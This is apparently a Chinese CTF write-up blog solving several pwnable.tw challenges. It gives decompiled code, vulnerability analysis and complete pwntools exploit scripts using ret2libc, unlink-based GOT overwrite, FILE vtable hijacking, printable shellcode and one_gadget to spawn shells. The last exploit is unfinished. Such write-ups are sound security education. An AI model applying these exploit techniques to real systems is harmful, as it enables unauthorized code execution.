strncat(bullet_ptr, &amp;s, 48 - *((_DWORD *)bullet_ptr + 12)); v3 = strlen(&amp;s) + *((_DWORD *)bullet_ptr + 12); printf(&quot;Your new power is : %u\\n&quot;, v3); *((_DWORD *)bullet_ptr + 12) = v3; return puts(&quot;Enjoy it !&quot;);&#125; 分析乍一看感觉逻辑没什么问题，寻找可能有问题的地方，最后问题在strncat上因为程序的存在一个结构 1234struct bullet&#123; char bullet_ptr[0x30] int length&#125; 而strncat合并字符串时，合并完之后会在后面加上\\x00,因为上面结构体的存在，我们就有希望覆盖length，然后再次powerup便可以溢出覆盖返回地址了。 exp本地测试莫名其妙过不了，但是远程没问题。。。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from pwn import *#context.log_level = &apos;debug&apos;#sh = process (&apos;./silver_bullet&apos;)sh = remote(&apos;chall.pwnable.tw&apos;,10103)elf = ELF(&apos;./silver_bullet&apos;)libc = ELF(&apos;libc_32.so.6&apos;)def create(con): sh.sendline(&apos;1&apos;) sh.recvuntil(&apos;of bullet :&apos;) sh.send(con)def powerup(con): sh.sendline(&apos;2&apos;) sh.recvuntil(&apos;of bullet :&apos;) sh.send(con)def beat(): sh.sendline(&apos;3&apos;)pop_ebx_ret = 0x8048475create(&apos;a&apos;*(0x30-1))powerup(&apos;1&apos;)pay = &apos;\\xff&apos;*3 + &apos;zzzz&apos;pay += p32(elf.plt[&apos;puts&apos;]) + p32(pop_ebx_ret) + p32(elf.got[&apos;puts&apos;])pay += p32(elf.symbols[&apos;main&apos;])powerup(pay)beat()sh.recvuntil(&apos;win !!\\n&apos;)puts_addr = u32(sh.recv(4))system_addr = puts_addr - libc.symbols[&apos;puts&apos;] + libc.symbols[&apos;system&apos;]binsh_addr = puts_addr - libc.symbols[&apos;puts&apos;] + libc.search(&apos;/bin/sh\\x00&apos;).next()success(&quot;system_addr : &quot; + hex(system_addr))success(&quot;binsh_addr : &quot; + hex(binsh_addr))create(&apos;a&apos;*(0x30-1))powerup(&apos;1&apos;)pay = &apos;\\xff&apos;*3 + &apos;bbbb&apos;pay += p32(system_addr) + p32(pop_ebx_ret) + p32(binsh_addr)powerup(pay)beat()sh.recv()sh.interactive() applestore好难啊啊啊啊啊，心累的不行，看大佬的wp回回血 ps: 假如在 libc = ELF(‘./libc_32.so.6’) 时出现这种报错：ValueError: seek out of range ， 多半就是文件没下载完全。。 题目主要功能 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748int menu()&#123; puts(&quot;=== Menu ===&quot;); printf(&quot;%d: Apple Store\\n&quot;, 1); printf(&quot;%d: Add into your shopping cart\\n&quot;, 2); printf(&quot;%d: Remove from your shopping cart\\n&quot;, 3); printf(&quot;%d: List your shopping cart\\n&quot;, 4); printf(&quot;%d: Checkout\\n&quot;, 5); return printf(&quot;%d: Exit\\n&quot;, 6);&#125;unsigned int handler()&#123; char nptr; // [esp+16h] [ebp-22h] unsigned int v2; // [esp+2Ch] [ebp-Ch] v2 = __readgsdword(0x14u); while ( 1 ) &#123; printf(&quot;&gt; &quot;); fflush(stdout); my_read(&amp;nptr, 0x15u); switch ( atoi(&amp;nptr) ) &#123; case 1: list(); break; case 2: add(); break; case 3: delete(); break; case 4: cart(); break; case 5: checkout(); break; case 6: puts(&quot;Thank You for Your Purchase!&quot;); return __readgsdword(0x14u) ^ v2; default: puts(&quot;It&apos;s not a choice! Idiot.&quot;); break; &#125; &#125;&#125; 其他函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135unsigned int add() //添加购物车，采用了my_read函数，但是存在问题，也就是在read时可以输入\\x00在中间分隔，以便在不影响后面的基础上，覆盖后面栈上的内容。&#123; char **v1; // [esp+1Ch] [ebp-2Ch] char nptr; // [esp+26h] [ebp-22h] unsigned int v3; // [esp+3Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf(&quot;Device Number&gt; &quot;); fflush(stdout); my_read(&amp;nptr, 0x15u); switch ( atoi(&amp;nptr) ) &#123; case 1: v1 = create((int)&quot;iPhone 6&quot;, (char *)199); insert((int)v1); goto LABEL_8; case 2: v1 = create((int)&quot;iPhone 6 Plus&quot;, (char *)299); insert((int)v1); goto LABEL_8; case 3: v1 = create((int)&quot;iPad Air 2&quot;, (char *)499); insert((int)v1); goto LABEL_8; case 4: v1 = create((int)&quot;iPad Mini 3&quot;, (char *)399); insert((int)v1); goto LABEL_8; case 5: v1 = create((int)&quot;iPod Touch&quot;, (char *)199); insert((int)v1);LABEL_8: printf(&quot;You&apos;ve put *%s* in your shopping cart.\\n&quot;, *v1); puts(&quot;Brilliant! That&apos;s an amazing idea.&quot;); break; default: puts(&quot;Stop doing that. Idiot!&quot;); break; &#125; return __readgsdword(0x14u) ^ v3;&#125;int cart()&#123; signed int v0; // eax signed int v2; // [esp+18h] [ebp-30h] int cost; // [esp+1Ch] [ebp-2Ch] _DWORD *i; // [esp+20h] [ebp-28h] char buf; // [esp+26h] [ebp-22h] unsigned int v6; // [esp+3Ch] [ebp-Ch] v6 = __readgsdword(0x14u); v2 = 1; cost = 0; printf(&quot;Let me check your cart. ok? (y/n) &gt; &quot;); fflush(stdout); my_read(&amp;buf, 0x15u); if ( buf == &apos;y&apos; ) &#123; puts(&quot;==== Cart ====&quot;); //遍历链表来输出cart for ( i = (_DWORD *)mycart; i; i = (_DWORD *)i[2] ) &#123; v0 = v2++; printf(&quot;%d: %s - $%d\\n&quot;, v0, *i, i[1]); // i[1] == money cost += i[1]; &#125; &#125; return cost;&#125;unsigned int delete()&#123; signed int v1; // [esp+10h] [ebp-38h] _DWORD *v2; // [esp+14h] [ebp-34h] int v3; // [esp+18h] [ebp-30h] int FD; // [esp+1Ch] [ebp-2Ch] int BK; // [esp+20h] [ebp-28h] char nptr; // [esp+26h] [ebp-22h] unsigned int v7; // [esp+3Ch] [ebp-Ch] v7 = __readgsdword(0x14u); v1 = 1; v2 = (_DWORD *)mycart; printf(&quot;Item Number&gt; &quot;); fflush(stdout); my_read(&amp;nptr, 0x15u); v3 = atoi(&amp;nptr); while ( v2 ) &#123; if ( v1 == v3 ) //典型的unlink &#123; FD = v2[2]; BK = v2[3]; if ( BK ) *(_DWORD *)(BK + 8) = FD; if ( FD ) *(_DWORD *)(FD + 12) = BK; printf(&quot;Remove %d:%s from your shopping cart.\\n&quot;, v1, *v2); return __readgsdword(0x14u) ^ v7; &#125; ++v1; v2 = (_DWORD *)v2[2]; &#125; return __readgsdword(0x14u) ^ v7;&#125;unsigned int checkout()&#123; int v1; // [esp+10h] [ebp-28h] char *v2; // [esp+18h] [ebp-20h] int v3; // [esp+1Ch] [ebp-1Ch] unsigned int v4; // [esp+2Ch] [ebp-Ch] v4 = __readgsdword(0x14u); v1 = cart(); if ( v1 == 7174 ) &#123; puts(&quot;*: iPhone 8 - $1&quot;); asprintf(&amp;v2, &quot;%s&quot;, &quot;iPhone 8&quot;); v3 = 1; insert((int)&amp;v2); v1 = 7175; &#125; printf(&quot;Total: $%d\\n&quot;, v1); puts(&quot;Want to checkout? Maybe next time!&quot;); return __readgsdword(0x14u) ^ v4;&#125; 分析在不断的使用添加购物车的函数add后，其形成了一个链表，而在输出时是通过遍历链表来依次输出的。结构str大概如下： 1234str[0]: coststr[1]: name---&gt; 实际为指针str[2]: FDstr[3]: BK 而我们在输入时使用的my_read函数（cart/delete函数均调用）因为可以覆盖后面的栈，所以会有希望去修改链表的节点为got表之类的。然后cart函数来泄露libc基址等等。 同时，在delete函数中使用了unlink的过程，也有利用的希望。RELRO不是full说明GOT表还是可以修改的，所以可以用unlink来修改got表. 1234567# checksec applestore[*] &apos;/root/pwnable/applestore/applestore&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 不过漏洞利用的切入点其实在后面，在checkout函数里，当购物车金额达到7174，就会赠送一个iphone8…而偏偏赠送的这个iphone8被放在了栈里面。而其实这几个函数用的都是同一栈帧（栈顶或许有差异，但是栈底是一致的），而恰好存储iphone8的位置在其他函数中可以被修改。也就是链表的结尾分配到了我们可以修改的栈上。 除此以外，需要栈地址的泄露，可以： 利用前面的leak洞,从第一个chunk开始,不断leak chunk的fd,直到stack上的chunk的前一个的chunk的fd,即可得到stack 我们可以用environ变量加上libc的基址来得到栈地址。 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869from pwn import *#sh = process(&apos;./applestore&apos;)sh = remote(&apos;chall.pwnable.tw&apos;, 10104)bin = ELF(&apos;./applestore&apos;)libc = ELF(&apos;./libc_32.so.6&apos;)def buy(idx): sh.sendline(&apos;2&apos;) sh.recvuntil(&apos;Device Number&gt; &apos;) sh.sendline(str(idx))def dele(idx): sh.sendline(&apos;3&apos;) sh.recvuntil(&apos;Item Number&gt; &apos;) sh.sendline(str(idx))def dele2(con): sh.sendline(&apos;3&apos;) sh.recvuntil(&apos;Item Number&gt; &apos;) sh.sendline(con)def show(con): sh.sendline(&apos;4&apos;) sh.recvuntil(&apos;(y/n) &gt; &apos;) sh.sendline(con)def checkout(): sh.sendline(&apos;5&apos;) sh.recvuntil(&apos;(y/n) &gt; &apos;) sh.sendline(&apos;y&apos;)for i in range(20): buy(2)for i in range(6): buy(1)checkout()pay = &apos;y\\x00&apos;pay+=p32(bin.got[&apos;puts&apos;]) + 3*p32(0)show(pay)sh.recvuntil(&apos;27: &apos;)libc.address = u32(sh.recv(4))-libc.symbols[&apos;puts&apos;]envp = libc.symbols[&apos;environ&apos;]system = libc.symbols[&apos;system&apos;]success(&apos;libc_base: &apos;+hex(libc.address))success(&apos;envp: &apos;+hex(envp))pay = &apos;y\\x00&apos;pay+=p32(envp)+p32(1)+p32(0)+p32(0)show(pay)sh.recvuntil(&apos;27: &apos;)stack_envp = u32(sh.recv(4))success(&apos;stack_envp: &apos;+hex(stack_envp)) //通过environ泄露栈地址//仍未理解的过程：交换GOT和ebp,从而子函数ret后回到main,ebp会到GOT上,在main中read,会读到GOT表上,可以改写atoi到system.ebp = stack_envp-0x104atoi_got = bin.got[&apos;atoi&apos;]pay = &apos;27&apos;pay += p32(envp)+p32(1)+p32(ebp-0xc)+p32(atoi_got+0x20-2)dele2(pay)pay = &apos;$0\\x00\\x00&apos;+p32(system)sh.sendline(pay)sh.interactive() critical_heap难到仅有的wp基本上完全看不懂。。。 题目题目比较长，功能比较丰富。。 分析出来的结构体： 1234567891011121314151617181920212223242526272829303132struct clock&#123; int *name; int inuse; 0xDEADBEEF; char[4] year; char[4] month; char[4] day; char[4] hour; char[4] minute; char[4] second;&#125;; struct system&#123; int *name; int inuse; 0x48694869; string PathOfSystem; string DetailOfSystem; char[4] UserOfSystem; char[4] NameOfSystem; char[4] rand;&#125;; struct normal&#123; int *name; int inuse; 0x13371337; char[40] content; int sig;&#125;; 分析完全没有见过的漏洞。。。相较于文件漏洞，倒更像是函数源码漏洞与小小的文件漏洞相配合产生的大问题。。。 localtime和setenv配合能将任意文件内容写到heap上. chunk_system的detail在offset 0x20,chunk_normal的content在offset 0x18的位置,content读取的时候没有截断,而detail是存在栈上的,因此可以leak heap. （比较容易想到的漏洞,文件漏洞）. 在normal_heap的play下,有一个printf_chk的fmt洞,配合normal_heap的play下的change content就能在栈上留下信息,然后任意地址读(因为有chk,所以应该是无法用%n来任意地址写的). 第一步需要看localtime的源码：以libc2.23源码为例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166/* Return the `struct tm&apos; representation of *T in local time. */struct tm *localtime (const time_t *t)&#123; return __tz_convert (t, 1, &amp;_tmbuf);&#125;libc_hidden_def (localtime)/* Return the `struct tm&apos; representation of *TIMER in the local timezone. Use local time if USE_LOCALTIME is nonzero, UTC otherwise. */struct tm *__tz_convert (const time_t *timer, int use_localtime, struct tm *tp)&#123; long int leap_correction; int leap_extra_secs; if (timer == NULL) &#123; __set_errno (EINVAL); return NULL; &#125; __libc_lock_lock (tzset_lock); /* Update internal database according to current TZ setting. POSIX.1 8.3.7.2 says that localtime_r is not required to set tzname. This is a good idea since this allows at least a bit more parallelism. */ tzset_internal (tp == &amp;_tmbuf &amp;&amp; use_localtime, 1); if (__use_tzfile) __tzfile_compute (*timer, use_localtime, &amp;leap_correction, &amp;leap_extra_secs, tp); &lt;--无关代码省略--&gt; return tp;&#125;/* Interpret the TZ envariable. */static voidinternal_functiontzset_internal (int always, int explicit)&#123; static int is_initialized; const char *tz; if (is_initialized &amp;&amp; !always) return; is_initialized = 1; /* Examine the TZ environment variable. */ tz = getenv (&quot;TZ&quot;);//★注意此处,从env中读取TZ的值 if (tz == NULL &amp;&amp; !explicit) /* Use the site-wide default. This is a file name which means we would not see changes to the file if we compare only the file name for change. We want to notice file changes if tzset() has been called explicitly. Leave TZ as NULL in this case. */ tz = TZDEFAULT; if (tz &amp;&amp; *tz == &apos;\\0&apos;) /* User specified the empty string; use UTC explicitly. */ tz = &quot;Universal&quot;; /* A leading colon means &quot;implementation defined syntax&quot;. We ignore the colon and always use the same algorithm: try a data file, and if none exists parse the 1003.1 syntax. */ if (tz &amp;&amp; *tz == &apos;:&apos;) ++tz; /* Check whether the value changed since the last run. */ if (old_tz != NULL &amp;&amp; tz != NULL &amp;&amp; strcmp (tz, old_tz) == 0) /* No change, simply return. */ return; if (tz == NULL) /* No user specification; use the site-wide default. */ tz = TZDEFAULT; tz_rules[0].name = NULL; tz_rules[1].name = NULL; /* Save the value of `tz&apos;. */ free (old_tz); old_tz = tz ? __strdup (tz) : NULL; /* Try to read a data file. */ __tzfile_read (tz, 0, NULL);//★带着TZ进入__tzfile_read函数 if (__use_tzfile) return;&lt;--无关代码省略--&gt;&#125;void__tzfile_read (const char *file, size_t extra, char **extrap)&#123; static const char default_tzdir[] = TZDIR; size_t num_isstd, num_isgmt; FILE *f; struct tzhead tzhead; size_t chars; size_t i; size_t total_size; size_t types_idx; size_t leaps_idx; int was_using_tzfile = __use_tzfile; int trans_width = 4; size_t tzspec_len; char *new = NULL; if (sizeof (time_t) != 4 &amp;&amp; sizeof (time_t) != 8) abort (); __use_tzfile = 0; if (file == NULL) /* No user specification; use the site-wide default. */ file = TZDEFAULT; else if (*file == &apos;\\0&apos;) /* User specified the empty string; use UTC with no leap seconds. */ goto ret_free_transitions; else &#123; /* We must not allow to read an arbitrary file in a setuid program. So we fail for any file which is not in the directory hierachy starting at TZDIR and which is not the system wide default TZDEFAULT. */ if (__libc_enable_secure &amp;&amp; ((*file == &apos;/&apos; &amp;&amp; memcmp (file, TZDEFAULT, sizeof TZDEFAULT) &amp;&amp; memcmp (file, default_tzdir, sizeof (default_tzdir) - 1)) || strstr (file, &quot;../&quot;) != NULL)) /* This test is certainly a bit too restrictive but it should catch all critical cases. */ goto ret_free_transitions; &#125; if (*file != &apos;/&apos;) &#123; const char *tzdir; tzdir = getenv (&quot;TZDIR&quot;);//★从环境变量TZDIR中读取目录 if (tzdir == NULL || *tzdir == &apos;\\0&apos;) tzdir = default_tzdir; if (__asprintf (&amp;new, &quot;%s/%s&quot;, tzdir, file) == -1) goto ret_free_transitions; file = new; &#125; /* If we were already using tzfile, check whether the file changed. */ struct stat64 st; if (was_using_tzfile &amp;&amp; stat64 (file, &amp;st) == 0 &amp;&amp; tzfile_ino == st.st_ino &amp;&amp; tzfile_dev == st.st_dev &amp;&amp; tzfile_mtime == st.st_mtime) goto done; /* Nothing to do. */ /* Note the file is opened with cancellation in the I/O functions disabled and if available FD_CLOEXEC set. */ f = fopen (file, &quot;rce&quot;);//★打开文件 最后是通过malloc读取文件内容到heap上的，所以我们只需要控制TZ 和 TZDIR 就能读取flag内容到heap上；（类似于函数源码漏洞？） printf_chk 源码 12345678910111213141516171819202122/* Write formatted output to stdout from the format string FORMAT. */int___printf_chk (int flag, const char *format, ...)&#123; va_list ap; int done; _IO_acquire_lock_clear_flags2 (stdout); if (flag &gt; 0) stdout-&gt;_flags2 |= _IO_FLAGS2_FORTIFY; va_start (ap, format); done = vfprintf (stdout, format, ap); va_end (ap); if (flag &gt; 0) stdout-&gt;_flags2 &amp;= ~_IO_FLAGS2_FORTIFY; _IO_release_lock (stdout); return done;&#125;ldbl_strong_alias (___printf_chk, __printf_chk) printf_chk 格式化字符串漏洞。。。神奇、、 seethefile第一次见FILE题，学习一下 题目功能 1234567891011int menu()&#123; puts(&quot;---------------MENU---------------&quot;); puts(&quot; 1. Open&quot;); puts(&quot; 2. Read&quot;); puts(&quot; 3. Write to screen&quot;); puts(&quot; 4. Close&quot;); puts(&quot; 5. Exit&quot;); puts(&quot;----------------------------------&quot;); return printf(&quot;Your choice :&quot;);&#125; open打开文件，read读入0x18f的数据，如果文件名或读入的数据中没有‘flag’ 或 ‘FLAG’，就能够write到屏幕上，close关闭文件，exit时让输入姓名，会溢出。 分析后面给了一个明显的溢出，也就是我们的切入点，gdb调试发现name在bss段，后面只有一个指向文件的fp指针，意图很明显。我们可以先读取/map/self/maps 来获取程序的段信息，虽然能读入的信息较少，但是足以获得heap基地址以用来得到libc基地址。至于fp指针，需要将其覆盖并继续溢出伪造一个FILE结构体，fp指针就是指向这个结构体以避免程序错误退出，同时将伪造的虚表上的vtable该为system，fclose即可即可调用system。 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *context.log_level = &apos;debug&apos;#sh = process(&apos;./seethefile&apos;)sh = remote(&apos;chall.pwnable.tw&apos;, 10200)elf = ELF(&apos;./seethefile&apos;)libc = ELF(&apos;./libc_32.so.6&apos;)def open(name): sh.recvuntil(&apos;Your choice :&apos;) sh.sendline(&apos;1&apos;) sh.recvuntil(&apos;see :&apos;) sh.sendline(name)def read(): sh.recvuntil(&apos;Your choice :&apos;) sh.sendline(&apos;2&apos;)def write(): sh.recvuntil(&apos;Your choice :&apos;) sh.sendline(&apos;3&apos;)def close(): sh.recvuntil(&apos;Your choice :&apos;) sh.sendline(&apos;4&apos;)def exit(con): sh.recvuntil(&apos;Your choice :&apos;) sh.sendline(&apos;5&apos;) sh.recvuntil(&apos;Leave your name :&apos;) sh.sendline(con)open(&apos;/proc/self/maps&apos;)read()write()sh.recvline()sh.recvline()sh.recvline()heap = int(sh.recvline()[:8],16)success(&apos;heap: &apos;+hex(heap))libc.address = int(sh.recvline()[:8],16)+0x1000success(&apos;libc_base: &apos;+hex(libc.address))system = libc.symbols[&apos;system&apos;]close()pay = &apos;\\x00&apos;*32 + p32(0x0804B300)pay+=&apos;\\x00&apos;*(0x80-4)file = &apos;\\xff\\xff\\xff\\xff;$0\\x00&apos;.ljust(0x48,&apos;\\x00&apos;)file = file.ljust(0x94,&apos;\\x00&apos;) //在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8;pay+=filepay+=p32(0x0804B300+0x98)pay+=p32(system)*21#vtableexit(pay)sh.interactive() death_note话说这边的题难度真是飘忽不定。。 题目123456789101112131415161718192021int menu()&#123; puts(&quot;-----------------------------------&quot;); puts(&quot; DeathNote &quot;); puts(&quot;-----------------------------------&quot;); puts(&quot; 1. Add a name &quot;); puts(&quot; 2. show a name on the note &quot;); puts(&quot; 3. delete a name int the note &quot;); puts(&quot; 4. Exit &quot;); puts(&quot;-----------------------------------&quot;); return printf(&quot;Your choice :&quot;);&#125;# checksec death_note[*] &apos;/root/pwnable/death_note1/death_note&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 分析题目的功能就是menu上的那样，不过在里面add的时候，index是自己选的，而且没有任何限制， 所以是有希望随便输入负数，将name也就是我们要输入的shellcode往上覆盖到got表来get shell。 输入的内容会进行检查，必须是可打印字符且最长为0x50，所以shellcode也需要在限制条件之内。shellcode可以使用metasploit自带的msfvenom来生成。 12 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *sh = process(&apos;./death_note&apos;)sh = remote(&apos;chall.pwnable.tw&apos;, 10201)def add(idx,con): sh.sendline(&apos;1&apos;) sh.recvuntil(&apos;Index :&apos;) sh.sendline(str(idx)) sh.recvuntil(&apos;Name :&apos;) sh.sendline(con)def dele(idx): sh.sendline(&apos;3&apos;) sh.recvuntil(&apos;Index :&apos;) sh.sendline(str(idx))pay = asm(&apos;&apos;&apos;/* execve(&apos;/bin///sh&apos;,0,0)*/push 0x68push 0x732f2f2fpush 0x6e69622fpush esppop ebx /*set ebx to &apos;/bin///sh&apos;*/push edxdec edxdec edx /*set dl to 0xfe*/xor [eax+32],dl /*decode int 0x80*/xor [eax+33],dl /*decode int 0x80*/inc edxinc edx /*recover edx to 0*/push edxpop ecx /*set ecx to 0*/push 0x40pop eaxxor al,0x4b /*set eax to 0xb*//*int 0x80*/&apos;&apos;&apos;)+&apos;\\x33\\x7e&apos;add(-19,pay)dele(-19)sh.interactive() babystack终于有时间继续做了、、 题目保护全开。。。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; _QWORD *v3; // rcx __int64 v4; // rdx char des; // [rsp+0h] [rbp-60h] __int64 buf; // [rsp+40h] [rbp-20h] __int64 v8; // [rsp+48h] [rbp-18h] char v9; // [rsp+50h] [rbp-10h] mmap_for_proc(); files[0] = open(&quot;/dev/urandom&quot;, 0); read(files[0], &amp;buf, 0x10uLL); v3 = IsMmap_ptr; v4 = v8; *IsMmap_ptr = buf; v3[1] = v4; close(files[0]); while ( 1 ) &#123; write(1, &quot;&gt;&gt; &quot;, 3uLL); _read_chk(0LL, &amp;v9, 0x10LL, 0x10LL); if ( v9 == &apos;2&apos; ) break; if ( v9 == &apos;3&apos; ) &#123; if ( password_inuse ) read_to_des(&amp;des); else puts(&quot;Invalid choice&quot;); &#125; else if ( v9 == &apos;1&apos; ) &#123; if ( password_inuse ) password_inuse = 0; else login(&amp;buf); &#125; else &#123; puts(&quot;Invalid choice&quot;); &#125; &#125; if ( !password_inuse ) exit(0); if ( memcmp(&amp;buf, IsMmap_ptr, 0x10uLL) ) JUMPOUT(loc_100B); return 0LL;&#125;int __fastcall login(const char *buf)&#123; size_t len; // rax char s; // [rsp+10h] [rbp-80h] printf(&quot;Your passowrd :&quot;); read_int(&amp;s, 0x7Fu); len = strlen(&amp;s); if ( strncmp(&amp;s, buf, len) ) return puts(&quot;Failed !&quot;); password_inuse = 1; return puts(&quot;Login Success !&quot;);&#125;int __fastcall read_to_des(char *des)&#123; char src; // [rsp+10h] [rbp-80h] printf(&quot;Copy :&quot;); read_int(&amp;src, 0x3Fu); strcpy(des, &amp;src); return puts(&quot;It is magic copy !&quot;);&#125; 分析main函数刚开始随机得到0x10个字节的数据并将其复制到buf处，并将全局变量指针*IsMmap_ptr指向该内存。read_chk读入参数，1-login(与随机得到的0x10个字节进行比较输入字节长度len的密码是否正确)或清除密码标志位密码，2-退出，3-检查密码标志位，为1则可读入0x3f字节的数据复制到des处 问题： login时可以不输入密码，直接回车可以跳过判定；或者以/x00开头跳过判定；或者可以依次爆破得到随机数password。 strcpy将src处的值复制到des，靠的是识别末尾处的/x00截断，而read_int并不会自动给加上/x00，因为输入字节的限制，看上去感觉并不会溢出，但是因为login函数用的是同一个栈段，所以有希望在src[0x3f]处将其置为非/x00，这样strcpy便会产生溢出。 为了getshell，rop不太可能–canary的存在，使得可能爆破出来的canary在最后会有/x00截断，这样strcpy就没法溢出到返回地址处了。所以应该要使用Onegadget一发入魂，但是libc地址搞不出来。。。。 得到大佬的思路：strcpy后原来的buf处变为两个libc中的地址，将其泄露计算libc基地址即可（ps：这一步仍有问题） exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384# one_gadget ./libc_64.so.6 0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: rax == NULL0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xef6c4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf0567 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints: [rsp+0x70] == NULLfrom pwn import *context.log_level = &apos;debug&apos;sh = process(&apos;./babystack&apos;)libc = ELF(&apos;./libc_64.so.6&apos;)bin = ELF(&apos;./babystack&apos;)one_gadget_offset = 0x45216def copy(): sh.recvuntil(&apos;&gt;&gt; &apos;) sh.sendline(&apos;3&apos;) sh.recvuntil(&apos;Copy :&apos;) sh.send(s)def login(pwd,lo=1): if lo: sh.send(&apos;1&apos;+&apos;a&apos;*15) else: sh.send(&apos;1&apos;) sh.recvuntil(&apos;Your passowrd :&apos;) sh.send(pwd) return sh.recvuntil(&apos;&gt;&gt; &apos;)def guess(length,secret=&apos;&apos;): for i in range(length): for q in range(1,256): if &apos;Success&apos; in login(secret+chr(q)+&apos;\\n&apos;,False): secret+=chr(q) sh.sendline(&apos;1&apos;) sh.recvuntil(&apos;&gt;&gt; &apos;) break return secretdef logout(): sh.sendline(&apos;1&apos;) sh.recvuntil(&apos;&gt;&gt; &apos;)# 爆破随机数secret = guess(16)# 绕过login，将src[0x3f]设置为非0，并将随机数位置变为libc的地址login(&apos;\\x00&apos;+&apos;a&apos;*0x57)copy(&apos;a&apos;*0x40)logout()# strcpy溢出泄露buf位置的libcbase = u64(guess(6,&apos;a&apos;*16+&apos;1&apos;+&apos;a&apos;*7)[24:]+&apos;\\x00\\x00&apos;)-324-libc.symbols[&apos;setvbuf&apos;] //泄漏的位置有点诡异。。。one_gadget_addr = one_gadget_offset + base## 覆盖返回地址到one_gadget_addr 得到shellpay = &apos;\\x00&apos; + &apos;a&apos; * 0x3f + secret + &apos;a&apos; *0x18 + p64(one_gadget_addr)login(pay)copy(&apos;a&apos;*0x40)sh.sendline(&apos;2&apos;)sh.interactive() spirited_away比较简短的一个程序，不过好久没看题了。。考试实习忙的一批 题目123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566int survey()&#123; char v1; // [esp+10h] [ebp-E8h] size_t nbytes; // [esp+48h] [ebp-B0h] size_t v3; // [esp+4Ch] [ebp-ACh] char s; // [esp+50h] [ebp-A8h] int age; // [esp+A0h] [ebp-58h] void *name; // [esp+A4h] [ebp-54h] int reason; // [esp+A8h] [ebp-50h] nbytes = 0x3C; v3 = 0x50;LABEL_2: memset(&amp;s, 0, 0x50u); name = malloc(0x3Cu); printf(&quot;\\nPlease enter your name: &quot;); fflush(stdout); read(0, name, nbytes); printf(&quot;Please enter your age: &quot;); fflush(stdout); __isoc99_scanf(&quot;%d&quot;, &amp;age); printf(&quot;Why did you came to see this movie? &quot;); fflush(stdout); read(0, &amp;reason, v3); fflush(stdout); printf(&quot;Please enter your comment: &quot;); fflush(stdout); read(0, &amp;s, nbytes); ++cnt; printf(&quot;Name: %s\\n&quot;, name); printf(&quot;Age: %d\\n&quot;, age); printf(&quot;Reason: %s\\n&quot;, &amp;reason); //leak printf(&quot;Comment: %s\\n\\n&quot;, &amp;s); fflush(stdout); sprintf(&amp;v1, &quot;%d comment so far. We will review them as soon as we can&quot;, cnt); puts(&amp;v1); puts(&amp;::s); fflush(stdout); if ( cnt &gt; 199 ) &#123; puts(&quot;200 comments is enough!&quot;); fflush(stdout); exit(0); &#125; while ( 1 ) &#123; printf(&quot;Would you like to leave another comment? &lt;y/n&gt;: &quot;); fflush(stdout); read(0, &amp;choice, 3u); if ( choice == &apos;Y&apos; || choice == &apos;y&apos; ) &#123; free(name); goto LABEL_2; &#125; if ( choice == &apos;N&apos; || choice == &apos;n&apos; ) break; puts(&quot;Wrong choice.&quot;); fflush(stdout); &#125; puts(&quot;Bye!&quot;); return fflush(stdout);&#125; 分析题目疯狂使用fflush(stdout),容易让人产生怀疑。。前面均使用read读入，不会在结尾加任何东西，但是在输出时使用printf会泄露栈上的内容，也就有希望得到libc基地址和栈地址；第二个漏洞比较隐蔽，看了v神的思路，自己调试了半天，才终于看出这个漏洞. 1sprintf(&amp;v1, &quot;%d comment so far. We will review them as soon as we can&quot;, cnt); 这一句看上去是没什么问题，但是在输出时，1,10,100占的位数并不相同，因为应该是把cnt以字符串形式来输出的，这样达到100次及以上之后，最后一个字母n溢出到了nbytes的位置，把原来的0x3c变成了0x6e,而这个nbytes是控制后面输入的comment的长度的，comment可以溢出到name指针的位置就能控制这个指针任意地址free，可以将其修改至栈上，之后分配name时就可以将其分配到栈上写入system(‘/bin/sh’)，rop得到shell。 exp鉴于gdb还是不能与pwntools一起调试，各个地址不能得到准确值，所以之后搞好了再写完整的exp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *context.log_level = &apos;debug&apos;sh = process(&apos;./spirited_away&apos;)bin = ELF(&apos;./spirited_away&apos;)libc = ELF(&apos;./libc_32.so.6&apos;)def comment(name,age,reason,comments): sh.recvuntil(&quot;name: &quot;) sh.sendline(name) sh.recvuntil(&quot;age: &quot;) sh.sendline(str(age)) sh.recvuntil(&quot;movie? &quot;) sh.sendline(reason) sh.recvuntil(&quot;comment: &quot;) sh.sendline(comments)comment(&apos;sir&apos;,19,&apos;a&apos;*16,&apos;b&apos;*2)sh.recvuntil(&apos;a&apos;*16)io_file_sync9 = sh.recv(4)#gdb.attach(sh)libc.address = u32(io_file_sync9) - libc.sym[&apos;_IO_file_sync&apos;]-9success(&quot;libc_addr = &quot; + hex(libc.address))sh.recvuntil(&apos;Would you like to leave another comment? &lt;y/n&gt;: 